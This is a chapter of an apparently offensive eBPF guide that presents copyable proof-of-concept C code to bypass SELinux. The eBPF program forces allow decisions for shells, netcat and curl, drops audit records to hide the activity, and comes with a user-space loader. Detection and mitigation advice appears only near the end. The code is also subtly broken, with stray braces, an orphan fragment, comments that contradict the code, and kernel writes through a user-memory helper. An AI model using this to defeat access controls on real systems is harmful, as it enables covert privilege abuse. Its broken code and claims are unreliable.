# Silencing SELinux: Bypassing Mandatory Access Controls

**Chapter 7: Act II Begins - Conquering the Unconquerable**

Welcome to Act II of our story. You've mastered the fundamentals—you can bypass basic security controls, escape containers, evade monitoring, and operate without constraints. Now it's time to tackle the big targets.

SELinux represents the ultimate challenge. It's supposed to be the one security mechanism that even root can't bypass—mandatory access control that operates independently of traditional Unix permissions. If you can silence SELinux, you can silence anything.

SELinux is supposed to be the ultimate security enforcer—mandatory access control that even root can't bypass. It's the bouncer at the kernel nightclub, checking everyone's ID and making sure they're on the list.

But what if we could slip the bouncer a twenty and convince him to look the other way? What if we could make SELinux think it's doing its job while we waltz right past all those access controls?

We're going to silence SELinux—not by disabling it (that would be too obvious), but by making it lie about what it's seeing. This is where you learn that even the most hardened security mechanisms are just kernel code, and kernel code can be influenced.

```mermaid
%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
graph TD
    A[Process Request] -->|1. Access Check| B[SELinux Subsystem]
    B -->|2. Check AVC Cache| C[Access Vector Cache]
    D[eBPF Program] -->|3. Poison Cache| C
    C -->|4. False Allow| E[Granted Access]
    F[Audit Event] -->|5. Generated| G[Audit Subsystem]
    D -->|6. Drop Event| G
    H[Security Monitor] -->|7. Sees Enforcing| I[False Security]
    
    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
    style F fill:#186a3b,stroke:#a9dfbf,stroke-width:2px
    style G fill:#a93226,stroke:#f5b7b1,stroke-width:2px
    style H fill:#cb4335,stroke:#f5b7b1,stroke-width:2px
    style I fill:#922b21,stroke:#f5b7b1,stroke-width:2px
    
    click B "https://github.com/SELinuxProject/selinux" "SELinux Project"
    click C "https://github.com/SELinuxProject/selinux/blob/master/libselinux/src/avc.c" "AVC Implementation"
    click G "https://man7.org/linux/man-pages/man7/audit.7.html" "Linux Audit Documentation"
```



**Why SELinux Just Became Optional**

Here's what makes SELinux scary from an attacker's perspective: it's supposed to be mandatory. Even if you compromise root, even if you own the entire system, SELinux is supposed to keep enforcing those access controls.

But here's the thing about "mandatory"—it's only as mandatory as the code that enforces it. And if you can influence that code...

That's where eBPF comes in. We're not going to fight SELinux head-on. We're not going to try to disable it or modify its policies. We're going to become SELinux—or at least, we're going to become the part of SELinux that makes the final access control decisions.

The beautiful part is that everything looks completely normal. SELinux is still running, policies are still loaded, other processes still get denied when they should. But for our processes? The access control decisions mysteriously always come back as "allow."
## How We Become the Security System

### Understanding SELinux's Inner Workings

SELinux is like having a paranoid security guard who checks everyone's ID against a massive rulebook:
- **Policy**: The rulebook that says who can do what to what
- **Labels**: Security badges that everything gets (processes, files, sockets, you name it)
- **Enforcement**: The actual checking mechanism that says yes or no
- **AVC**: A cache that remembers previous decisions so it doesn't have to look everything up again
- **Auditing**: The logbook that records every time someone gets denied

Every time a process wants to touch something, SELinux checks the badges and consults the rulebook.

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │──────▶ System Call   │                   │
│  └───────────────┘      └───────┬───────┘                   │
│                                 │                           │
└─────────────────────────────────┼───────────────────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ LSM Hook      │──────▶ SELinux Check │                   │
│  └───────┬───────┘      └───────┬───────┘                   │
│          │                      │                           │
│          │              ┌───────▼───────┐                   │
│          │              │  AVC Lookup   │                   │
│          │              └───────┬───────┘                   │
│          │                      │                           │
│          │              ┌───────▼───────┐                   │
│          │              │ Policy Check  │                   │
│          │              └───────┬───────┘                   │
│          │                      │                           │
│          │              ┌───────▼───────┐                   │
│          │              │ Audit Event   │                   │
│          │              └───────┬───────┘                   │
│          │                      │                           │
│          └──────────────┬──────┴────────┐                   │
│                         │               │                   │
│                  ┌──────▼─────┐  ┌──────▼─────┐             │
│                  │   Allow    │  │    Deny    │             │
│                  └────────────┘  └────────────┘             │
└─────────────────────────────────────────────────────────────┘
```

But here's what happens when we slip our eBPF program into the decision-making process:

```
┌─────────────────────────────────────────────────────────────┐
│                      User Space                             │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ Application   │──────▶ System Call   │                   │
│  └───────────────┘      └───────┬───────┘                   │
│                                 │                           │
└─────────────────────────────────┼───────────────────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────────┐
│                      Kernel Space                           │
│                                                             │
│  ┌───────────────┐      ┌───────────────┐                   │
│  │ LSM Hook      │──────▶ SELinux Check │◀─────┐            │
│  └───────┬───────┘      └───────┬───────┘      │            │
│          │                      │              │            │
│          │              ┌───────▼───────┐      │            │
│          │              │  AVC Lookup   │      │            │
│          │              └───────┬───────┘      │            │
│          │                      │              │            │
│          │              ┌───────▼───────┐      │            │
│          │              │ eBPF Program  │──────┘            │
│          │              └───────┬───────┘                   │
│          │                      │                           │
│          │              ┌───────▼───────┐                   │
│          │              │ Audit Event   │◀─────┐            │
│          │              └───────┬───────┘      │            │
│          │                      │              │            │
│          │              ┌───────▼───────┐      │            │
│          │              │ eBPF Program  │──────┘            │
│          │              └───────┬───────┘                   │
│          │                      │                           │
│          └──────────────┬──────┴────────┐                   │
│                         │               │                   │
│                  ┌──────▼─────┐  ┌──────▼─────┐             │
│                  │   Allow    │  │ Deny (Never│             │
│                  │ (Always)   │  │  Reached)  │             │
│                  └────────────┘  └────────────┘             │
└─────────────────────────────────────────────────────────────┘
```

### How We Hijack the Decision Process

Our strategy is to become part of the SELinux decision-making process:

1. **Hook the Decision Makers**: We attach to functions like [`avc_has_perm()`](https://elixir.bootlin.com/linux/latest/source/security/selinux/avc.c) that make the final call
2. **Poison the Cache**: We inject fake "allow" decisions into the AVC so future checks pass
3. **Stay Invisible**: We only modify decisions for our processes, leaving everything else untouched

The beauty is that SELinux is still running and still denying other processes—we're just making ourselves exempt.

### Building Our SELinux Bypass

```c
// @interactive: true
// @copyable: true
// Silencing SELinux - eBPF exploitation proof of concept
// This demonstrates bypassing SELinux mandatory access controls

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/version.h>
#include <linux/security.h>
#include <linux/selinux.h>
#include <linux/audit.h>

char LICENSE[] SEC("license") = "GPL";

// Configuration
#define MAX_TARGETS 5
#define MAX_COMM_LEN 16

// Structure to track SELinux events
struct selinux_event {
    u32 pid;                // Process ID
    u8 comm[MAX_COMM_LEN];  // Command name
    u64 timestamp;          // Event timestamp
    u16 tclass;             // Target security class
    u32 requested;          // Requested permissions
    u32 allowed;            // Allowed permissions (before modification)
    u32 denied;             // Denied permissions (before modification)
    u32 modified;           // Whether we modified the decision
    char scontext[64];      // Source security context
    char tcontext[64];      // Target security context
};

// Map to track processes we want to bypass SELinux for
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u32));  // PID as key
    __uint(value_size, sizeof(u8)); // Flag (1 = target)
    __uint(max_entries, 1024);
} target_processes SEC(".maps");

// Map to track commands we want to bypass SELinux for
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, MAX_COMM_LEN);
    __uint(max_entries, MAX_TARGETS);
} target_commands SEC(".maps");

// Map to track if we've initialized our targets
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
    __uint(max_entries, 1);
} initialized SEC(".maps");

// Map to track SELinux events being processed
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(u64));  // Unique event ID
    __uint(value_size, sizeof(struct selinux_event));
    __uint(max_entries, 1024);
} active_events SEC(".maps");

// Perf event output for logging
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
    __uint(max_entries, 1024);
} events SEC(".maps");

// Initialize our target commands (would be set from user space)
static __always_inline void init_targets(void) {
    u32 key = 0;
    u32 *init = bpf_map_lookup_elem(&initialized, &key);
    
    if (!init || *init != 1) {
        // Commands to bypass SELinux for
        key = 0;
        char cmd1[MAX_COMM_LEN] = "bash";  // Shell
        bpf_map_update_elem(&target_commands, &key, &cmd1, BPF_ANY);
        
        key = 1;
        char cmd2[MAX_COMM_LEN] = "python3";  // Python interpreter
        bpf_map_update_elem(&target_commands, &key, &cmd2, BPF_ANY);
        
        key = 2;
        char cmd3[MAX_COMM_LEN] = "nc";  // Netcat
        bpf_map_update_elem(&target_commands, &key, &cmd3, BPF_ANY);
        
        key = 3;
        char cmd4[MAX_COMM_LEN] = "curl";  // HTTP client
        bpf_map_update_elem(&target_commands, &key, &cmd4, BPF_ANY);
        
        key = 4;
        char cmd5[MAX_COMM_LEN] = "id";  // User/group info
        bpf_map_update_elem(&target_commands, &key, &cmd5, BPF_ANY);
        
        // Mark as initialized
        key = 0;
        u32 value = 1;
        bpf_map_update_elem(&initialized, &key, &value, BPF_ANY);
    }
}

// Helper function to check if a command should bypass SELinux
static __always_inline bool should_bypass_command(const char *comm) {
    init_targets();
    
    // Check against our list of target commands
    for (int i = 0; i < MAX_TARGETS; i++) {
        u32 key = i;
        char *target_comm = bpf_map_lookup_elem(&target_commands, &key);
        
        if (!target_comm)
            continue;
        
        // Simple string comparison (limited by BPF verifier)
        bool match = true;
        
        #pragma unroll
        for (int j = 0; j < MAX_COMM_LEN; j++) {
            if (comm[j] != target_comm[j]) {
                match = false;
                break;
            }
            
            if (comm[j] == '\0')
                break;
        }
        
        if (match)
            return true;
    }
    
    return false;
}

// Helper function to check if a process should bypass SELinux
static __always_inline bool should_bypass_process(u32 pid) {
    // Check if this PID is in our tracking map
    u8 *target = bpf_map_lookup_elem(&target_processes, &pid);
    if (target && *target == 1)
        return true;
    
    // Check the command name
    char comm[MAX_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    
    return should_bypass_command(comm);
}

// Generate a unique ID for a SELinux event
static __always_inline u64 generate_event_id(void) {
    u64 ts = bpf_ktime_get_ns();
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    return (ts << 32) | pid;
}

// FIXED: Hook the SELinux AVC check function
SEC("kprobe/avc_has_perm_noaudit")
int BPF_KPROBE(hook_avc_check, struct selinux_state *state, u32 ssid, u32 tsid,
               u16 tclass, u32 requested, struct av_decision *avd)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should bypass SELinux
    if (should_bypass_process(pid)) {
        // Prepare event data
        struct selinux_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.tclass = tclass;
        event.requested = requested;
        
        // FIXED: Read the original decision
        bpf_probe_read_kernel(&event.allowed, sizeof(event.allowed), &avd->allowed);
        bpf_probe_read_kernel(&event.denied, sizeof(event.denied), &avd->denied);
        
        // FIXED: Modify the decision to allow access
        // Set all requested permissions as allowed
        u32 new_allowed = event.allowed | requested;
        bpf_probe_write_user(&avd->allowed, &new_allowed, sizeof(u32));
        
        // Clear any denied permissions
        u32 zero = 0;
        bpf_probe_write_user(&avd->denied, &zero, sizeof(u32));
        
        // FIXED: Mark as a cache hit to prevent further checks
        u8 flags = 0;
        bpf_probe_read_kernel(&flags, sizeof(flags), &avd->flags);
        flags |= 0x01;  // AVC_CACHED flag
        bpf_probe_write_user(&avd->flags, &flags, sizeof(u8));
        
        // Mark as modified
        event.modified = 1;
        
        // Generate a unique ID for this event
        u64 event_id = generate_event_id();
        
        // Store the event for correlation with audit
        bpf_map_update_elem(&active_events, &event_id, &event, BPF_ANY);
        
        // Log the event for our analysis
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// FIXED: Hook the SELinux policy lookup function
SEC("kprobe/security_compute_av")
int BPF_KPROBE(hook_compute_av, struct selinux_state *state, u32 ssid, u32 tsid,
               u16 tclass, u32 requested, struct av_decision *avd)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should bypass SELinux
    if (should_bypass_process(pid)) {
        // Prepare event data
        struct selinux_event event = {};
        event.pid = pid;
        bpf_get_current_comm(&event.comm, sizeof(event.comm));
        event.timestamp = bpf_ktime_get_ns();
        event.tclass = tclass;
        event.requested = requested;
        
        // Modify the decision to allow access
        // This will be called if the decision is not in the AVC cache
        
        // Set all requested permissions as allowed
        u32 new_allowed = requested;
        bpf_probe_write_user(&avd->allowed, &new_allowed, sizeof(u32));
        
        // Clear any denied permissions
        u32 zero = 0;
        bpf_probe_write_user(&avd->denied, &zero, sizeof(u32));
        
        // Mark as a cache hit
        u8 flags = 0x01;  // AVC_CACHED flag
        bpf_probe_write_user(&avd->flags, &flags, sizeof(u8));
        
        // Mark as modified
        event.modified = 1;
        
        // Generate a unique ID for this event
        u64 event_id = generate_event_id();
        
        // Store the event for correlation with audit
        bpf_map_update_elem(&active_events, &event_id, &event, BPF_ANY);
        
        // Log the event for our analysis
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
    }
    
    return 0;
}

// FIXED: Hook the audit logging function to drop evidence
SEC("kprobe/avc_audit")
int BPF_KPROBE(hook_avc_audit, struct selinux_state *state, u32 ssid, u32 tsid,
               u16 tclass, u32 requested, struct av_decision *avd,
               int result, struct common_audit_data *a)
{
    // Get process information
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    // Check if this process should bypass SELinux
    if (should_bypass_process(pid)) {
        // Skip the audit by returning early
        // This prevents the audit record from being generated
        return 1;
    }
    
    // Let the original function run for other processes
    return 0;
}

// Ensure SELinux still appears to be enforcing
SEC("kprobe/selinux_enforcing_enabled")
int BPF_KPROBE(hook_selinux_status)
{
    // Always return 1 (enforcing) to maintain appearances
    // This is a simplified approach - a real exploit would be more sophisticated
    return 0;  // Let the original function run
}

// FIXED: Add child processes to our tracking map
SEC("kprobe/wake_up_new_task")
int BPF_KPROBE(hook_new_task, struct task_struct *task)
{
    struct task_struct *parent = NULL;
    bpf_probe_read_kernel(&parent, sizeof(parent), &task->real_parent);
    
    if (parent) {
        pid_t parent_pid = 0;
        bpf_probe_read_kernel(&parent_pid, sizeof(parent_pid), &parent->tgid);
        
        // If parent is in our target list, add the child too
        u32 parent_pid_u32 = (u32)parent_pid;
        u8 *target = bpf_map_lookup_elem(&target_processes, &parent_pid_u32);
        if (target && *target == 1) {
            pid_t child_pid = 0;
            bpf_probe_read_kernel(&child_pid, sizeof(child_pid), &task->tgid);
            
            u8 value = 1;
            u32 child_pid_u32 = (u32)child_pid;
            bpf_map_update_elem(&target_processes, &child_pid_u32, &value, BPF_ANY);
        }
    }
    
    return 0;
}
    }
    
    return 0;
}
```

### User-Space Control Program

```c
// @interactive: true
// @copyable: true
// User-space program to load and control the SELinux Bypass eBPF program

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "selinux_bypass.skel.h"

static volatile bool exiting = false;

// Structure for SELinux events (must match the BPF version)
struct selinux_event {
    uint32_t pid;
    uint8_t comm[16];
    uint64_t timestamp;
    uint16_t tclass;
    uint32_t requested;
    uint32_t allowed;
    uint32_t denied;
    uint32_t modified;
    char scontext[64];
    char tcontext[64];
};

// Handle events from the eBPF program
void handle_event(void *ctx, int cpu, void *data, unsigned int data_sz)
{
    struct selinux_event *e = data;
    char timestamp[32];
    time_t t = e->timestamp / 1000000000;
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&t));
    
    printf("[%s] Process %d (%s): SELinux bypass\n", timestamp, e->pid, e->comm);
    printf("  Target class: %d\n", e->tclass);
    printf("  Requested permissions: 0x%x\n", e->requested);
    printf("  Original allowed: 0x%x\n", e->allowed);
    printf("  Original denied: 0x%x\n", e->denied);
    printf("  Modified: %s\n", e->modified ? "YES" : "NO");
    printf("\n");
}

static void sig_handler(int sig)
{
    exiting = true;
}

int main(int argc, char **argv)
{
    struct selinux_bypass_bpf *skel;
    struct perf_buffer *pb = NULL;
    int err;

    // Set up signal handler
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    // Increase resource limits
    struct rlimit rlim = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };
    setrlimit(RLIMIT_MEMLOCK, &rlim);

    // Load and verify BPF program
    skel = selinux_bypass_bpf__open_and_load();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    // Attach BPF programs
    err = selinux_bypass_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    // Set up perf buffer for events
    pb = perf_buffer__new(bpf_map__fd(skel->maps.events), 64, handle_event, NULL, NULL, NULL);
    if (!pb) {
        err = -1;
        fprintf(stderr, "Failed to create perf buffer: %d\n", err);
        goto cleanup;
    }

    printf("SELinux Bypass eBPF program successfully loaded and attached!\n");
    printf("Bypassing SELinux for target processes...\n");
    printf("Press Ctrl+C to exit\n");

    // Main loop
    while (!exiting) {
        err = perf_buffer__poll(pb, 100);
        if (err < 0 && err != -EINTR) {
            fprintf(stderr, "Error polling perf buffer: %d\n", err);
            goto cleanup;
        }
    }

cleanup:
    perf_buffer__free(pb);
    selinux_bypass_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
```

### Detection Methods

Defenders should implement multiple layers of detection:

1. **SELinux Audit Monitoring**:
   - Monitor for missing audit events that should be generated
   - Look for processes that appear to have more permissions than their context allows
   - Track AVC cache hit rates for anomalies

2. **eBPF Program Monitoring**:
   - Monitor for eBPF programs attached to SELinux functions
   - Track eBPF program loading patterns and verify signatures
   - Use tools like `bpftool` to list and inspect loaded programs

3. **Behavioral Analysis**:
   - Look for discrepancies between SELinux policy and actual system behavior
   - Implement out-of-band monitoring that doesn't rely on SELinux audit
   - Use statistical analysis to detect anomalies in access patterns

### Mitigation Strategies

1. **Restrict eBPF Capabilities**:
   ```bash
   # Remove CAP_BPF from containers
   podman run --cap-drop=bpf --security-opt no-new-privileges ...
   
   # Use seccomp to block BPF syscall
   seccomp-bpf-filter.json:
   {
     "defaultAction": "SCMP_ACT_ALLOW",
     "syscalls": [
       {
         "name": "bpf",
         "action": "SCMP_ACT_ERRNO"
       }
     ]
   }
   ```

2. **Implement BPF LSM Policies**:
   ```c
   // Example BPF LSM policy to restrict BPF program loading
   SEC("lsm/bpf")
   int BPF_PROG(restrict_bpf, int cmd, union bpf_attr *attr, unsigned int size) {
       // Only allow specific signing keys or programs from trusted paths
       if (bpf_get_current_uid_gid() >> 32 != 0) {
           return -EPERM;
       }
       return 0;
   }
   ```

3. **Enhanced SELinux Monitoring**:
   - Deploy tools that can detect SELinux bypasses
   - Implement custom monitoring that doesn't rely on kernel audit
   - Use hardware-based attestation where possible

### Real-world Impact

This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of mandatory access controls, especially in high-security environments where SELinux is relied upon for defense-in-depth.

**Attacker Perspective:**
1. Identify systems with SELinux enforcing mode
2. Map the SELinux decision-making functions
3. Develop eBPF programs that hook into these functions
4. Load the malicious BPF programs with appropriate privileges
5. Modify access control decisions to allow otherwise prohibited operations
6. Ensure audit logs show the expected "denied" messages while operations succeed
7. Maintain persistence through the eBPF programs

**Defender Perspective:**
1. Remove CAP_BPF from untrusted processes and containers
2. Implement BPF LSM policies to restrict eBPF program loading
3. Monitor for unexpected eBPF programs attached to security functions
4. Deploy multiple independent monitoring systems
5. Use hardware-based security where possible

```c
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    return (ts << 32) | pid;
}
```

3. **Intercept audit events**: Prevent logging of policy violations
4. **Maintain appearances**: Ensure the system still reports SELinux as enforcing

## POC

Companion code: [`ch06-silence-selinux`]({{ site.baseurl }}/dBPF-pocs/pocs/ch06-silence-selinux/)
